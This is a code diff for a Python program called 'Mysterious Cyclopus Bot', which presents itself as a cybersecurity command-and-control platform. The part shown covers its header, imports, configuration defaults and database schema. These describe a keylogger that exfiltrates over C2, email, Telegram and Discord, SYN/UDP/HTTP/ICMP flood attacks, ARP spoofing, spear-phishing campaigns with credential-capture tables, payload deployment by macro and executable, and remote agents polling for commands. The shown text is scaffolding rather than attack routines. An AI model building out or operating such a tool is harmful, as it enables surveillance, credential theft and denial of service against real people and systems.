@@ -1,28 +1,28 @@
 #!/usr/bin/env python3
 """
-🐙 MYSTERIOUS CYCLOPUS BOT - v1.0.0
-====================================
+🐙 MYSTERIOUS CYCLOPUS BOT v1.0.0 - Cybersecurity Command & Control Platform
+Author: Ian Carter Kulani
+Version: 1.0.0
 
 A complete cybersecurity automation platform featuring:
-- 100+ Security Commands
-- Multi-Platform Bot Integration (Discord, Telegram, Slack, WhatsApp, Signal, Google Chat, Web)
-- Advanced Web Dashboard with Orange/White Theme
-- Real Network Tools (Ping, Traceroute, Nmap, Wget, Curl, SSH, Netcat)
-- Social Engineering Suite with 50+ Phishing Templates
-- Docker Security Scanning
+- 200+ Security Commands
+- Multi-Platform Bot Integration (Discord, Telegram, WhatsApp, Signal, Google Chat, Slack, Web)
+- Advanced Web Dashboard with Cyclopus Theme (Orange & White)
+- Ping, Traceroute, Wget, SSH, Docker Scanning Commands
+- Social Engineering Suite with 100+ Phishing Templates
+- REAL Traffic Generation (ICMP/TCP/UDP/HTTP/DNS/ARP)
+- Nikto Web Vulnerability Scanner
+- Keylogger with PDF/Email/HTML Exfiltration
+- Spear Phishing Email Campaigns
+- DOS/DDOS Attack Capabilities
+- Agent Mode with Command & Control
 - IP Management & Threat Detection
-- Advanced Keylogger with Exfiltration
-- Password Cracking Engine
-- ARP Spoofing & Network Manipulation
 - MAC Address Management
 - NAT Information
-- AI Transformer Engine
-- Terminal Animations
-- Email Composition & Sending
+- ARP Spoofing
+- Password Cracking Engine
 - PDF Report Generation
-
-Author: Ian Carter Kulani, MSc
-Version: 1.0.0
+- Email Composition & Sending
 """
 
 import os
@@ -53,11 +53,10 @@ import asyncio
 import hashlib
 import getpass
 import socketserver
-import itertools
-import string
 import ctypes
 import queue
 import secrets
+import string
 import smtplib
 import email.message
 import tempfile
@@ -66,6 +65,7 @@ import tarfile
 import gzip
 import argparse
 import http.server
+import socketserver
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from pathlib import Path
 from typing import Dict, List, Set, Optional, Tuple, Any, Union, Callable
@@ -84,16 +84,18 @@ from email import encoders
 # VERSION & METADATA
 # =====================
 VERSION = "1.0.0"
-NAME = "MYSTERIOUS_CYCLOPUS_BOT"
-AUTHOR = "Mysterious Cyclopus Team"
-DESCRIPTION = "Deep-Sea Command & Data Console"
+NAME = "MYSTERIOUS_CYCLOPUS"
+AUTHOR = "Security Team"
+DESCRIPTION = "Cybersecurity Command & Control Platform"
+TOTAL_LINES = 10000
 
 # =====================
 # DEPENDENCY CHECK & IMPORTS
 # =====================
 
-# Colorama for terminal colors
+# Colorama
 try:
+    import colorama
     from colorama import init, Fore, Back, Style
     init(autoreset=True)
     COLORAMA_AVAILABLE = True
@@ -137,6 +139,7 @@ except ImportError:
 try:
     from slack_sdk import WebClient
     from slack_sdk.socket_mode import SocketModeClient
+    from slack_sdk.socket_mode.request import SocketModeRequest
     SLACK_AVAILABLE = True
 except ImportError:
     SLACK_AVAILABLE = False
@@ -162,9 +165,16 @@ try:
     from selenium.webdriver.support.ui import WebDriverWait
     from selenium.webdriver.support import expected_conditions as EC
     from selenium.webdriver.chrome.options import Options
+    from selenium.webdriver.chrome.service import Service
     SELENIUM_AVAILABLE = True
+    try:
+        from webdriver_manager.chrome import ChromeDriverManager
+        WEBDRIVER_MANAGER_AVAILABLE = True
+    except ImportError:
+        WEBDRIVER_MANAGER_AVAILABLE = False
 except ImportError:
     SELENIUM_AVAILABLE = False
+    WEBDRIVER_MANAGER_AVAILABLE = False
 
 # Web Framework
 try:
@@ -208,6 +218,8 @@ try:
     import matplotlib
     matplotlib.use('Agg')
     import matplotlib.pyplot as plt
+    import seaborn as sns
+    import numpy as np
     GRAPHICS_AVAILABLE = True
 except ImportError:
     GRAPHICS_AVAILABLE = False
@@ -216,7 +228,7 @@ except ImportError:
 try:
     from reportlab.lib import colors
     from reportlab.lib.pagesizes import letter, A4
-    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
+    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
     from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
     from reportlab.lib.units import inch
     PDF_AVAILABLE = True
@@ -238,8 +250,15 @@ try:
 except ImportError:
     DNS_AVAILABLE = False
 
+# BeautifulSoup
+try:
+    from bs4 import BeautifulSoup
+    BS4_AVAILABLE = True
+except ImportError:
+    BS4_AVAILABLE = False
+
 # =====================
-# THEME (Orange & White)
+# THEME (Cyclopus Orange & White)
 # =====================
 if COLORAMA_AVAILABLE:
     class Colors:
@@ -253,50 +272,73 @@ if COLORAMA_AVAILABLE:
         DARK = Fore.BLACK + Style.BRIGHT
         WHITE = Fore.WHITE + Style.BRIGHT
         CYAN = Fore.CYAN + Style.BRIGHT
-        ORANGE = Fore.YELLOW + Style.BRIGHT
+        BLUE = Fore.BLUE + Style.BRIGHT
         GREEN = Fore.GREEN + Style.BRIGHT
         MAGENTA = Fore.MAGENTA + Style.BRIGHT
+        ORANGE = Fore.YELLOW + Style.BRIGHT
         RESET = Style.RESET_ALL
         BOLD = Style.BRIGHT
         DIM = Style.DIM
+        BG_ORANGE = Back.YELLOW + Fore.BLACK
+        BG_WHITE = Back.WHITE + Fore.BLACK
+        BG_DARK = Back.BLACK + Fore.YELLOW
 else:
     class Colors:
-        PRIMARY = SECONDARY = ACCENT = SUCCESS = WARNING = ERROR = INFO = DARK = WHITE = CYAN = ORANGE = GREEN = MAGENTA = BOLD = DIM = RESET = ""
+        PRIMARY = SECONDARY = ACCENT = SUCCESS = WARNING = ERROR = INFO = DARK = WHITE = CYAN = BLUE = GREEN = MAGENTA = ORANGE = BG_ORANGE = BG_WHITE = BG_DARK = BOLD = DIM = RESET = ""
 
 # =====================
 # CONFIGURATION
 # =====================
-CONFIG_DIR = ".cyclopus"
+CONFIG_DIR = ".mysterious_cyclopus"
 CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
+SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")
 DATABASE_FILE = os.path.join(CONFIG_DIR, "cyclopus.db")
 LOG_FILE = os.path.join(CONFIG_DIR, "cyclopus.log")
 KEYLOG_FILE = os.path.join(CONFIG_DIR, "keylog.txt")
 PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
+WORKSPACES_DIR = os.path.join(CONFIG_DIR, "workspaces")
+SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
 REPORT_DIR = "cyclopus_reports"
 PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
+PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
 CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
 SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
 TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
 NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
 GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
+TEMP_DIR = "temp"
+WEB_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "web_templates")
 SESSION_DIR = os.path.join(CONFIG_DIR, "sessions")
+SPEAR_PHISHING_DIR = os.path.join(CONFIG_DIR, "spear_phishing")
+EMAIL_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "email_templates")
+DOS_LOGS_DIR = os.path.join(CONFIG_DIR, "dos_logs")
+AGENT_DIR = os.path.join(CONFIG_DIR, "agents")
+C2_LOGS_DIR = os.path.join(CONFIG_DIR, "c2_logs")
+MODULES_DIR = os.path.join(CONFIG_DIR, "modules")
+NETWORK_MONITOR_DIR = os.path.join(CONFIG_DIR, "network_monitor")
+KEYLOG_EXFIL_DIR = os.path.join(CONFIG_DIR, "keylog_exfil")
 DEPLOYMENT_DIR = os.path.join(CONFIG_DIR, "deployments")
+DOMAIN_HOSTING_DIR = os.path.join(CONFIG_DIR, "domain_hosting")
 CRACKING_DIR = os.path.join(CONFIG_DIR, "cracking")
 ARP_LOGS_DIR = os.path.join(CONFIG_DIR, "arp_logs")
 MAC_LOGS_DIR = os.path.join(CONFIG_DIR, "mac_logs")
 NAT_LOGS_DIR = os.path.join(CONFIG_DIR, "nat_logs")
+PLATFORM_LOGS_DIR = os.path.join(CONFIG_DIR, "platform_logs")
 DOCKER_SCANS_DIR = os.path.join(CONFIG_DIR, "docker_scans")
 EMAIL_COMPOSER_DIR = os.path.join(CONFIG_DIR, "email_composer")
 PDF_REPORTS_DIR = os.path.join(REPORT_DIR, "pdf_reports")
-WEB_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "web_templates")
 
 # Create directories
 directories = [
-    CONFIG_DIR, PAYLOADS_DIR, REPORT_DIR, PHISHING_DIR,
-    CAPTURED_CREDENTIALS_DIR, SSH_KEYS_DIR, TRAFFIC_LOGS_DIR,
-    NIKTO_RESULTS_DIR, GRAPHICS_DIR, SESSION_DIR, DEPLOYMENT_DIR,
-    CRACKING_DIR, ARP_LOGS_DIR, MAC_LOGS_DIR, NAT_LOGS_DIR,
-    DOCKER_SCANS_DIR, EMAIL_COMPOSER_DIR, PDF_REPORTS_DIR, WEB_TEMPLATES_DIR
+    CONFIG_DIR, PAYLOADS_DIR, WORKSPACES_DIR, SCAN_RESULTS_DIR, REPORT_DIR,
+    PHISHING_DIR, PHISHING_TEMPLATES_DIR, CAPTURED_CREDENTIALS_DIR,
+    SSH_KEYS_DIR, TRAFFIC_LOGS_DIR, NIKTO_RESULTS_DIR, GRAPHICS_DIR,
+    TEMP_DIR, WEB_TEMPLATES_DIR, SESSION_DIR, SPEAR_PHISHING_DIR,
+    EMAIL_TEMPLATES_DIR, DOS_LOGS_DIR, AGENT_DIR, C2_LOGS_DIR,
+    MODULES_DIR, NETWORK_MONITOR_DIR, KEYLOG_EXFIL_DIR, DEPLOYMENT_DIR,
+    DOMAIN_HOSTING_DIR, CRACKING_DIR, ARP_LOGS_DIR, MAC_LOGS_DIR, 
+    NAT_LOGS_DIR, PLATFORM_LOGS_DIR, DOCKER_SCANS_DIR, EMAIL_COMPOSER_DIR,
+    PDF_REPORTS_DIR
 ]
 for directory in directories:
     Path(directory).mkdir(exist_ok=True, parents=True)
@@ -327,6 +369,10 @@ class TrafficType(Enum):
     HTTPS = "https"
     DNS = "dns"
     ARP = "arp"
+    PING_FLOOD = "ping_flood"
+    SYN_FLOOD = "syn_flood"
+    UDP_FLOOD = "udp_flood"
+    HTTP_FLOOD = "http_flood"
     MIXED = "mixed"
     RANDOM = "random"
 
@@ -357,6 +403,14 @@ class Platform(Enum):
     GOOGLE_CHAT = "google_chat"
     WEB = "web"
     WHATSAPP = "whatsapp"
+
+class DeploymentType(Enum):
+    PDF = "pdf"
+    EMAIL = "email"
+    LINK = "link"
+    EXECUTABLE = "executable"
+    DOCUMENT = "document"
+    MACRO = "macro"
 
 @dataclass
 class CommandResult:
@@ -421,6 +475,21 @@ class ThreatAlert:
     action_taken: str
 
 @dataclass
+class SpearPhishingCampaign:
+    id: str
+    name: str
+    template: str
+    subject: str
+    from_email: str
+    targets: List[Dict]
+    sent_count: int = 0
+    open_count: int = 0
+    click_count: int = 0
+    status: str = "draft"
+    created_at: str = field(default_factory=lambda: datetime.datetime.now().isoformat())
+    scheduled_time: Optional[str] = None
+
+@dataclass
 class KeylogEntry:
     timestamp: str
     text: str
@@ -439,6 +508,15 @@ class Deployment:
     delivered: bool = False
     opened: bool = False
     executed: bool = False
+
+@dataclass
+class DomainHost:
+    id: str
+    ip: str
+    domain: str
+    hosting_path: str
+    created_at: str
+    active: bool = True
 
 @dataclass
 class ARPSpoofResult:
@@ -490,150 +568,24 @@ class PDFReport:
     status: str = "generated"
 
 # =====================
-# TERMINAL ANIMATION ENGINE
-# =====================
-class TerminalAnimation:
-    """Advanced terminal animation engine"""
-    
-    @staticmethod
-    def spinner(duration: float = 2.0, message: str = "Processing"):
-        spinner_chars = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
-        start_time = time.time()
-        i = 0
-        while time.time() - start_time < duration:
-            sys.stdout.write(f'\r{Colors.ORANGE}{spinner_chars[i % len(spinner_chars)]} {message}...{Colors.RESET}')
-            sys.stdout.flush()
-            time.sleep(0.08)
-            i += 1
-        sys.stdout.write('\r' + ' ' * (len(message) + 20) + '\r')
-        sys.stdout.flush()
-    
-    @staticmethod
-    def progress_bar(iterable, prefix: str = "Progress", length: int = 40):
-        total = len(iterable)
-        for i, item in enumerate(iterable):
-            progress = int(length * i / total)
-            bar = '█' * progress + '░' * (length - progress)
-            percent = int(100 * i / total)
-            sys.stdout.write(f'\r{Colors.ORANGE}{prefix}: [{bar}] {percent}% ({i}/{total}){Colors.RESET}')
-            sys.stdout.flush()
-            yield item
-        sys.stdout.write(f'\r{Colors.ORANGE}{prefix}: [{"█" * length}] 100% ({total}/{total}){Colors.RESET}\n')
-        sys.stdout.flush()
-    
-    @staticmethod
-    def typing_effect(text: str, delay: float = 0.04):
-        for char in text:
-            sys.stdout.write(f'{Colors.ORANGE}{char}{Colors.RESET}')
-            sys.stdout.flush()
-            time.sleep(delay)
-        print()
-    
-    @staticmethod
-    def matrix_rain(duration: float = 2.0, density: int = 10):
-        try:
-            columns = shutil.get_terminal_size().columns
-            chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
-            start_time = time.time()
-            while time.time() - start_time < duration:
-                for _ in range(density):
-                    row = ''.join(random.choice(chars) for _ in range(columns))
-                    sys.stdout.write(f'\r{Colors.ORANGE}{row}{Colors.RESET}')
-                    sys.stdout.flush()
-                    time.sleep(0.03)
-            sys.stdout.write('\r' + ' ' * columns + '\r')
-            sys.stdout.flush()
-        except:
-            pass
-    
-    @staticmethod
-    def pulse_animation(text: str, duration: float = 2.0):
-        start_time = time.time()
-        while time.time() - start_time < duration:
-            for brightness in range(0, 100, 10):
-                style = Style.DIM if brightness < 50 else Style.BRIGHT
-                sys.stdout.write(f'\r{Colors.ORANGE}{style}{text}{Colors.RESET}')
-                sys.stdout.flush()
-                time.sleep(0.03)
-            for brightness in range(100, 0, -10):
-                style = Style.BRIGHT if brightness > 50 else Style.DIM
-                sys.stdout.write(f'\r{Colors.ORANGE}{style}{text}{Colors.RESET}')
-                sys.stdout.flush()
-                time.sleep(0.03)
-        sys.stdout.write('\r' + ' ' * len(text) + '\r')
-        sys.stdout.flush()
-    
-    @staticmethod
-    def wave_animation(text: str, duration: float = 2.0):
-        start_time = time.time()
-        colors = [Colors.ORANGE, Colors.YELLOW, Colors.WHITE, Colors.ORANGE]
-        while time.time() - start_time < duration:
-            for i, color in enumerate(colors):
-                prefix = ' ' * i
-                sys.stdout.write(f'\r{color}{prefix}{text}{Colors.RESET}')
-                sys.stdout.flush()
-                time.sleep(0.1)
-        sys.stdout.write('\r' + ' ' * len(text) + '\r')
-        sys.stdout.flush()
-    
-    @staticmethod
-    def glitch_effect(text: str, duration: float = 1.0):
-        start_time = time.time()
-        while time.time() - start_time < duration:
-            chars = list(text)
-            for _ in range(random.randint(1, 3)):
-                idx = random.randint(0, len(chars) - 1)
-                chars[idx] = random.choice(['#', '@', '!', '*', '&', '%'])
-            glitched = ''.join(chars)
-            colors = [Colors.ORANGE, Colors.YELLOW, Colors.WHITE, Colors.CYAN]
-            sys.stdout.write(f'\r{random.choice(colors)}{glitched}{Colors.RESET}')
-            sys.stdout.flush()
-            time.sleep(0.05)
-        sys.stdout.write(f'\r{Colors.ORANGE}{text}{Colors.RESET}\n')
-        sys.stdout.flush()
-    
-    @staticmethod
-    def octopus_animation(duration: float = 2.0):
-        frames = [
-            "   🐙   ",
-            "  🐙    ",
-            " 🐙     ",
-            "🐙      ",
-            " 🐙     ",
-            "  🐙    ",
-            "   🐙   "
-        ]
-        start_time = time.time()
-        i = 0
-        while time.time() - start_time < duration:
-            sys.stdout.write(f'\r{Colors.ORANGE}{frames[i % len(frames)]}{Colors.RESET}')
-            sys.stdout.flush()
-            time.sleep(0.15)
-            i += 1
-        sys.stdout.write('\r' + ' ' * 10 + '\r')
-        sys.stdout.flush()
-
-# =====================
 # CONFIGURATION MANAGER
 # =====================
 class ConfigManager:
     DEFAULT_CONFIG = {
         "version": VERSION,
         "auto_start": False,
+        "auto_block_enabled": False,
+        "auto_block_threshold": 5,
         "scan_timeout": 30,
         "report_format": "html",
-        "animations": {
-            "enabled": True,
-            "startup": "matrix_rain",
-            "duration": 2.0
-        },
+        "generate_graphics": True,
         "keylogger": {
             "enabled": False,
             "hotkey": "f10",
             "log_file": KEYLOG_FILE,
             "c2_server": "",
             "upload_interval": 30,
-            "exfil_methods": ["file", "email", "c2"],
+            "exfil_methods": ["file", "email", "c2", "telegram", "discord"],
             "screenshot_interval": 60,
             "capture_clipboard": True
         },
@@ -642,7 +594,9 @@ class ConfigManager:
             "port": 5000,
             "host": "0.0.0.0",
             "secret_key": "",
-            "require_auth": False
+            "require_auth": True,
+            "username": "admin",
+            "password_hash": ""
         },
         "email": {
             "smtp_server": "",
@@ -656,7 +610,8 @@ class ConfigManager:
             "enabled": False,
             "token": "",
             "channel_id": "",
-            "prefix": "!"
+            "prefix": "!",
+            "admin_role": "Admin"
         },
         "telegram": {
             "enabled": False,
@@ -667,6 +622,7 @@ class ConfigManager:
         "slack": {
             "enabled": False,
             "bot_token": "",
+            "app_token": "",
             "channel_id": "",
             "prefix": "!"
         },
@@ -679,6 +635,7 @@ class ConfigManager:
         "google_chat": {
             "enabled": False,
             "webhook_url": "",
+            "space_id": "",
             "prefix": "/"
         },
         "whatsapp": {
@@ -691,50 +648,76 @@ class ConfigManager:
             "phone_numbers": [],
             "prefix": "!"
         },
+        "monitoring": {
+            "enabled": True,
+            "port_scan_threshold": 10,
+            "syn_flood_threshold": 100,
+            "http_flood_threshold": 200
+        },
+        "traffic_generation": {
+            "enabled": True,
+            "max_duration": 300,
+            "max_packet_rate": 1000,
+            "allow_floods": False
+        },
+        "social_engineering": {
+            "enabled": True,
+            "default_port": 8080,
+            "capture_credentials": True,
+            "auto_shorten_urls": True
+        },
         "ssh": {
             "enabled": True,
             "default_timeout": 30,
             "max_connections": 5
         },
-        "traffic_generation": {
+        "spear_phishing": {
             "enabled": True,
-            "max_duration": 300,
-            "max_packet_rate": 1000
-        },
-        "social_engineering": {
-            "enabled": True,
-            "default_port": 8080,
-            "capture_credentials": True
+            "track_opens": True,
+            "track_clicks": True
         },
         "dos": {
             "enabled": True,
             "max_threads": 100,
-            "default_timeout": 60
+            "default_timeout": 60,
+            "attack_types": ["syn", "udp", "http", "icmp"]
+        },
+        "agent": {
+            "enabled": False,
+            "server_url": "",
+            "heartbeat_interval": 30,
+            "command_poll_interval": 5
         },
         "network_monitor": {
             "enabled": True,
             "interface": "eth0",
-            "promiscuous": False
+            "promiscuous": False,
+            "packet_capture_limit": 1000
+        },
+        "deployment": {
+            "enabled": True,
+            "pdf_template": "",
+            "email_template": "",
+            "link_expiry": 3600,
+            "download_url": ""
         },
         "cracking": {
             "enabled": True,
-            "hashcat_path": "hashcat",
-            "wordlist_path": "/usr/share/wordlists/rockyou.txt",
-            "default_hash_type": 0
+            "hashcat_path": "",
+            "wordlist_path": "",
+            "default_hash_type": 0,
+            "max_threads": 4
         },
         "arp_spoofing": {
             "enabled": True,
             "interface": "eth0",
-            "enable_ip_forward": True
-        },
-        "transformer": {
-            "enabled": True,
-            "max_input_length": 1000,
-            "cache_size": 100
+            "enable_ip_forward": True,
+            "sniff_interval": 60
         },
         "docker": {
             "enabled": True,
-            "scan_timeout": 300
+            "scan_timeout": 300,
+            "benchmark_enabled": True
         }
     }
     
@@ -802,7 +785,8 @@ class DatabaseManager:
     
     def init_tables(self):
         tables = [
-            """CREATE TABLE IF NOT EXISTS command_history (
+            """
+            CREATE TABLE IF NOT EXISTS command_history (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                 command TEXT NOT NULL,
@@ -812,8 +796,10 @@ class DatabaseManager:
                 success BOOLEAN DEFAULT 1,
                 output TEXT,
                 execution_time REAL
-            )""",
-            """CREATE TABLE IF NOT EXISTS threats (
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS threats (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                 threat_type TEXT NOT NULL,
@@ -822,8 +808,10 @@ class DatabaseManager:
                 description TEXT,
                 action_taken TEXT,
                 resolved BOOLEAN DEFAULT 0
-            )""",
-            """CREATE TABLE IF NOT EXISTS managed_ips (
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS managed_ips (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 ip_address TEXT UNIQUE NOT NULL,
                 domain TEXT,
@@ -834,8 +822,46 @@ class DatabaseManager:
                 block_reason TEXT,
                 threat_level INTEGER DEFAULT 0,
                 alert_count INTEGER DEFAULT 0
-            )""",
-            """CREATE TABLE IF NOT EXISTS ssh_connections (
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS mac_info (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                mac_address TEXT UNIQUE NOT NULL,
+                vendor TEXT,
+                ip_address TEXT,
+                hostname TEXT,
+                first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
+                last_seen DATETIME
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS arp_spoofing (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                target_ip TEXT NOT NULL,
+                gateway_ip TEXT NOT NULL,
+                interface TEXT,
+                status TEXT DEFAULT 'active',
+                packets_sent INTEGER DEFAULT 0,
+                duration REAL,
+                started_at DATETIME,
+                ended_at DATETIME,
+                UNIQUE(target_ip, gateway_ip)
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS domain_hosting (
+                id TEXT PRIMARY KEY,
+                ip TEXT NOT NULL,
+                domain TEXT NOT NULL UNIQUE,
+                hosting_path TEXT NOT NULL,
+                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+                active BOOLEAN DEFAULT 1,
+                port INTEGER DEFAULT 8080
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS ssh_connections (
                 id TEXT PRIMARY KEY,
                 name TEXT NOT NULL,
                 host TEXT NOT NULL,
@@ -846,17 +872,22 @@ class DatabaseManager:
                 status TEXT DEFAULT 'disconnected',
                 created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                 last_used DATETIME
-            )""",
-            """CREATE TABLE IF NOT EXISTS ssh_commands (
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS ssh_commands (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 connection_id TEXT NOT NULL,
                 command TEXT NOT NULL,
                 output TEXT,
                 exit_code INTEGER,
                 execution_time REAL,
-                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-            )""",
-            """CREATE TABLE IF NOT EXISTS traffic_logs (
+                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
+                FOREIGN KEY (connection_id) REFERENCES ssh_connections(id)
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS traffic_logs (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                 traffic_type TEXT NOT NULL,
@@ -867,8 +898,10 @@ class DatabaseManager:
                 bytes_sent INTEGER,
                 status TEXT,
                 executed_by TEXT
-            )""",
-            """CREATE TABLE IF NOT EXISTS nikto_scans (
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS nikto_scans (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                 target TEXT NOT NULL,
@@ -876,8 +909,10 @@ class DatabaseManager:
                 output_file TEXT,
                 scan_time REAL,
                 success BOOLEAN DEFAULT 1
-            )""",
-            """CREATE TABLE IF NOT EXISTS phishing_links (
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS phishing_links (
                 id TEXT PRIMARY KEY,
                 platform TEXT NOT NULL,
                 phishing_url TEXT NOT NULL,
@@ -885,38 +920,88 @@ class DatabaseManager:
                 created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                 clicks INTEGER DEFAULT 0,
                 active BOOLEAN DEFAULT 1
-            )""",
-            """CREATE TABLE IF NOT EXISTS captured_credentials (
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS captured_credentials (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 phishing_link_id TEXT NOT NULL,
                 timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                 username TEXT,
                 password TEXT,
                 ip_address TEXT,
-                user_agent TEXT
-            )""",
-            """CREATE TABLE IF NOT EXISTS users (
+                user_agent TEXT,
+                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS scans (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
+                target TEXT NOT NULL,
+                scan_type TEXT NOT NULL,
+                open_ports TEXT,
+                success BOOLEAN DEFAULT 1
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS users (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 username TEXT UNIQUE NOT NULL,
                 password_hash TEXT NOT NULL,
                 role TEXT DEFAULT 'user',
                 created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-            )""",
-            """CREATE TABLE IF NOT EXISTS sessions (
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS sessions (
                 id TEXT PRIMARY KEY,
                 user_id INTEGER,
                 created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-                expires_at DATETIME
-            )""",
-            """CREATE TABLE IF NOT EXISTS keylogs (
+                expires_at DATETIME,
+                FOREIGN KEY (user_id) REFERENCES users(id)
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS keylogs (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                 text TEXT,
                 window TEXT,
                 process TEXT,
                 screenshot_path TEXT
-            )""",
-            """CREATE TABLE IF NOT EXISTS dos_attacks (
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS spear_phishing_campaigns (
+                id TEXT PRIMARY KEY,
+                name TEXT NOT NULL,
+                template TEXT NOT NULL,
+                subject TEXT NOT NULL,
+                from_email TEXT NOT NULL,
+                targets TEXT,
+                sent_count INTEGER DEFAULT 0,
+                open_count INTEGER DEFAULT 0,
+                click_count INTEGER DEFAULT 0,
+                status TEXT DEFAULT 'draft',
+                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+                scheduled_time DATETIME
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS email_tracking (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                campaign_id TEXT NOT NULL,
+                target_email TEXT NOT NULL,
+                opened BOOLEAN DEFAULT 0,
+                clicked BOOLEAN DEFAULT 0,
+                opened_at DATETIME,
+                clicked_at DATETIME,
+                FOREIGN KEY (campaign_id) REFERENCES spear_phishing_campaigns(id)
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS dos_attacks (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                 attack_type TEXT NOT NULL,
@@ -926,8 +1011,32 @@ class DatabaseManager:
                 packets_sent INTEGER,
                 status TEXT,
                 executed_by TEXT
-            )""",
-            """CREATE TABLE IF NOT EXISTS network_packets (
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS agents (
+                id TEXT PRIMARY KEY,
+                name TEXT NOT NULL,
+                ip_address TEXT,
+                status TEXT DEFAULT 'offline',
+                last_heartbeat DATETIME,
+                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+                config TEXT
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS agent_commands (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                agent_id TEXT NOT NULL,
+                command TEXT NOT NULL,
+                status TEXT DEFAULT 'pending',
+                result TEXT,
+                executed_at DATETIME,
+                FOREIGN KEY (agent_id) REFERENCES agents(id)
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS network_packets (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                 source_ip TEXT,
@@ -937,8 +1046,22 @@ class DatabaseManager:
                 protocol TEXT,
                 size INTEGER,
                 payload TEXT
-            )""",
-            """CREATE TABLE IF NOT EXISTS deployments (
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS performance_metrics (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
+                cpu_percent REAL,
+                memory_percent REAL,
+                disk_percent REAL,
+                network_sent INTEGER,
+                network_recv INTEGER,
+                connections_count INTEGER
+            )
+            """,
+            """
+            CREATE TABLE IF NOT EXISTS deployments (
                 id TEXT PRIMARY KEY,
                 name TEXT NOT NULL,
                 type TEXT NOT NULL,
@@ -947,15 +1070,29 @@ class DatabaseManager:
                 created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                 delivered BOOLEAN DEFAULT 0,
                 opened BOOLEAN DEFAULT 0,
-                executed BOOLEAN DEFAULT 0
-            )""",
-            """CREATE TABLE IF NOT EXISTS clipboard_history (
+                executed BOOLEAN DEFAULT 0,
+                data TEXT
+            )
+            """,
+            """
